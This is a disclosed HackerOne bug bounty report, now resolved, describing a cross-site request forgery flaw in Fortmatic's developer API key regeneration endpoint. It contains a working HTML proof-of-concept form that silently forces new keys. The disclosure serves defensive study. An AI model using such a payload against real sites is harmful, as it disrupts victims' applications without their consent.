---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '593893'
original_report_id: '593893'
title: CSRF in generating developer api_key
weakness: Cross-Site Request Forgery (CSRF)
team_handle: magic-bbp
created_at: '2019-06-02T05:26:42.271Z'
disclosed_at: '2019-11-01T01:35:36.535Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 14
asset_identifier: api.fortmatic.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF in generating developer api_key

## Metadata

- HackerOne Report ID: 593893
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: magic-bbp
- Disclosed At: 2019-11-01T01:35:36.535Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi

At https://dashboard.forttmatic.com when developer tries to generate new api_key for his application, a POST request is sent to https://api.forttmatic.com which doesn't have any tokens to guard against CSRF attacks.

###CSRF POC :
```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://api.fortmatic.com/v1/dashboard/api_user/keys/regenerate" method="POST" enctype="text/plain">
      <input type="hidden" name="&#123;&#125;" value="" />
      <input type="submit" value="Generate New Keys" />
    </form>
  </body>
</html>

``` 

On submitting the above request, a new set of keys would be generated which destroys the current api_key set without the knowledge of developer.

## Impact

It doesn't have a great security impact other than that this would make the developer's app unusable because he would have to change the api_keys everywhere on his code to make the application working again.
This could be done any number of times. Everytime the developer has attacker's site opened in his browser keys would be regenerated leading to developer being left frustrated as to why his api_keys keep on changing even when he didn't ask for it and the pain to replace old pair of keys with the new one! :)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
